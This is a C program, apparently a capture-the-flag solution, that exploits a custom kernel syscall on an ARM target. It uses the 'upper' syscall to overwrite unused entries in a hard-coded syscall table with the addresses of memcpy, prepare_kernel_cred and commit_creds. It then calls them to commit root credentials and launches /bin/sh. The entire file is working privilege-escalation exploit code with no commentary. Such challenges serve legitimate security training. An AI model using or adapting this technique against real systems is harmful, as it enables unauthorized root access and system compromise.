#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>

#define SYS_upper       	(223)
#define SYS_unused_0		(224)
#define SYS_unused_1		(225)
#define SYS_unused_2		(226)

#define SYS_CALL_TABLE	            (void **)(0x8000e348)

#define UNUSED_SYSCALL_ADDR_0       (SYS_CALL_TABLE + SYS_unused_0)
#define UNUSED_SYSCALL_ADDR_1       (SYS_CALL_TABLE + SYS_unused_1)
#define UNUSED_SYSCALL_ADDR_2       (SYS_CALL_TABLE + SYS_unused_2)

#define MEMCPY_ADDR                 "\xe0\xfb\x18\x80"
#define PREPARE_KERNEL_CRED_ADDR    "$\xf9\x03\x80"
#define COMMIT_CREDS_ADDR           "l\xf5\x03\x80"

int upper(char* in, char* out){
    return syscall(SYS_upper, in, out);
}

void *kernel_memcpy(void *dest, const void *src, size_t n) {
    return syscall(SYS_unused_0, dest, src, n);
}

void* prepare_kernel_cred(){
    return (void *)syscall(SYS_unused_1, NULL);
}

int commit_creds_addr(void *creds){
    return syscall(SYS_unused_2, creds);
}

int main() {
    upper(MEMCPY_ADDR, UNUSED_SYSCALL_ADDR_0);
    printf("[v] unused(224) -> memcpy\n");

    kernel_memcpy(UNUSED_SYSCALL_ADDR_1, PREPARE_KERNEL_CRED_ADDR, 4);
    printf("[v] unused(225) -> prepare_kernel_creds\n");
    
    kernel_memcpy(UNUSED_SYSCALL_ADDR_2, COMMIT_CREDS_ADDR, 4);
    printf("[v] unused(226) -> commit_creds\n");

    void *kernel_creds = prepare_kernel_cred();

    printf("[v] allocated root creds at %p\n", kernel_creds);
    
    commit_creds_addr(kernel_creds);
    
    printf("[v] I am root!\n");

    char *argv[] = {"/bin/sh", NULL};
    execv("/bin/sh", argv);
}
